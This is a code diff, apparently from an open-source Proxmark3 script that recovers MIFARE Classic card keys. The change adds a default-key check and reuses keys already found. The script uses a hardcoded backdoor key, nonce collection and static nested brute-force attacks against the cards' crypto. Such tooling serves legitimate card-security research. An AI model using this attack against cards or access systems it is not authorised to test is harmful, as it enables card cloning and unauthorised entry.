@@ -20,6 +20,8 @@ from output_grabber import OutputGrabber
 
 BACKDOOR_RF08S = "A396EFA4E24F"
 NUM_SECTORS = 16
+# Run an initial check with the default keys
+INITIAL_CHECK = True
 # Run a final check with the found keys, mostly for validation
 FINAL_CHECK = True
 
@@ -55,6 +57,22 @@ if uid is None:
     exit()
 print(f"UID: {uid:08X}")
 
+found_keys = [["", ""] for _ in range(NUM_SECTORS)]
+if INITIAL_CHECK:
+    print("Checking default keys...")
+    with out:
+        p.console("hf mf fchk")
+    for line in out.captured_output.split('\n'):
+        if "[+]  0" in line:
+            res = [x.strip() for x in line.split('|')]
+            sec = int(res[0][4:])
+            if res[3] == '1':
+                found_keys[sec][0] = res[2]
+                print(f"Sector {sec:2} keyA = {found_keys[sec][0]}")
+            if res[5] == '1':
+                found_keys[sec][1] = res[4]
+                print(f"Sector {sec:2} keyB = {found_keys[sec][1]}")
+
 nt = [["", ""] for _ in range(NUM_SECTORS)]
 nt_enc = [["", ""] for _ in range(NUM_SECTORS)]
 par_err = [["", ""] for _ in range(NUM_SECTORS)]
@@ -62,9 +80,13 @@ print("Getting nonces...")
 with out:
     for sec in range(NUM_SECTORS):
         blk = sec * 4
-        for key_type in [0, 1]:
-            p.console(f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}")
-            p.console(f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S} --c2 {key_type}")
+        if found_keys[sec][0] == "" or found_keys[sec][1] == "":
+            # Even if one key already found, we'll need both nt
+            for key_type in [0, 1]:
+                cmd = f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}"
+                p.console(cmd)
+                cmd += f" --c2 {key_type}"
+                p.console(cmd)
 print("Processing traces...")
 for line in out.captured_output.split('\n'):
     if "nested cmd: 64" in line or "nested cmd: 65" in line:
@@ -84,8 +106,12 @@ print("Running staticnested_1nt & 2x1nt when doable...")
 keys = [[set(), set()] for _ in range(NUM_SECTORS)]
 all_keys = set()
 duplicates = set()
+# Availability of filtered dicts
+filtered_dicts = [[False, False] for _ in range(NUM_SECTORS)]
 for sec in range(NUM_SECTORS):
-    if nt[sec][0] != nt[sec][1]:
+    if found_keys[sec][0] != "" and found_keys[sec][1] != "":
+        continue
+    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] != nt[sec][1]:
         for key_type in [0, 1]:
             cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
                    nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
@@ -97,6 +123,7 @@ for sec in range(NUM_SECTORS):
         if DEBUG:
             print(' '.join(cmd))
         subprocess.run(cmd, capture_output=True)
+        filtered_dicts[sec][key_type] = True
         for key_type in [0, 1]:
             with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic")) as f:
                 keys_set = set()
@@ -106,8 +133,11 @@ for sec in range(NUM_SECTORS):
                 keys[sec][key_type] = keys_set
                 duplicates.update(all_keys.intersection(keys_set))
                 all_keys.update(keys_set)
-    else:
-        key_type = 0
+    else:  # one key not found or both identical
+        if found_keys[sec][0] == "":
+            key_type = 0
+        else:
+            key_type = 1
         cmd = [STATICNESTED_1NT, f"{uid:08X}", f"{sec}",
                nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
         if DEBUG:
@@ -129,9 +159,12 @@ for dup in duplicates:
         for key_type in [0, 1]:
             if dup in keys[sec][key_type]:
                 keys_filtered[sec][key_type].add(dup)
-                if nt[sec][0] == nt[sec][1] and key_type == 0 and keys[sec][1] == set():
+                if nt[sec][0] == nt[sec][1] and key_type == 0 and keys[sec][1] == set() and found_keys[sec][1] == "":
                     keys_filtered[sec][1].add(dup)
+                    continue
 
+# Availability of duplicates dicts
+duplicates_dicts = [[False, False] for _ in range(NUM_SECTORS)]
 first = True
 for sec in range(NUM_SECTORS):
     for key_type in [0, 1]:
@@ -142,14 +175,16 @@ for sec in range(NUM_SECTORS):
             with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic", "w")) as f:
                 for k in keys_filtered[sec][key_type]:
                     f.write(f"{k}\n")
+            duplicates_dicts[sec][key_type] = True
 
 abort = False
 print("Brute-forcing keys... Press any key to interrupt")
-found_keys = [["", ""] for _ in range(NUM_SECTORS)]
 for sec in range(NUM_SECTORS):
     for key_type in [0, 1]:
         # If we have a duplicates dict
-        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and len(keys_filtered[sec][key_type]) > 0:
+        # note: we skip if we already know one key
+        # as using 2x1nt1key later will be faster
+        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
             kt = ['a', 'b'][key_type]
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic"
             cmd = f"hf mf fchk --blk {sec * 4} -{kt} -f {dic} --no-default"
@@ -174,7 +209,10 @@ for sec in range(NUM_SECTORS):
         break
 
     for key_type in [0, 1]:
-        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] != nt[sec][1]:
+        # If we have a filtered dict
+        # note: we skip if we already know one key
+        # as using 2x1nt1key later will be faster
+        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and filtered_dicts[sec][key_type]:
             # Use filtered dict
             kt = ['a', 'b'][key_type]
             dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic"
@@ -195,6 +233,7 @@ for sec in range(NUM_SECTORS):
     if abort:
         break
 
+    # If one common key for the sector
     if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] == nt[sec][1]:
         key_type = 0
         # Use regular dict
@@ -216,20 +255,21 @@ for sec in range(NUM_SECTORS):
     if abort:
         break
 
+    # If one key is missing, use the other one with 2x1nt1key
     if ((found_keys[sec][0] == "") ^ (found_keys[sec][1] == "")) and nt[sec][0] != nt[sec][1]:
-        # use 2x1nt1key
         if (found_keys[sec][0] == ""):
             key_type_source = 1
             key_type_target = 0
         else:
             key_type_source = 0
             key_type_target = 1
-        if len(keys_filtered[sec][key_type_target]) > 0:
-            cmd = [STATICNESTED_2X1NT1KEY, nt[sec][key_type_source], found_keys[sec][key_type_source],
-                   f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_duplicates.dic"]
+        if duplicates_dicts[sec][key_type_target]:
+            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_duplicates.dic"
+        elif filtered_dicts[sec][key_type_target]:
+            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_filtered.dic"
         else:
-            cmd = [STATICNESTED_2X1NT1KEY, nt[sec][key_type_source], found_keys[sec][key_type_source],
-                   f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}_filtered.dic"]
+            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type_target]}.dic"
+        cmd = [STATICNESTED_2X1NT1KEY, nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
         if DEBUG:
             print(' '.join(cmd))
         result = subprocess.run(cmd, capture_output=True, text=True).stdout
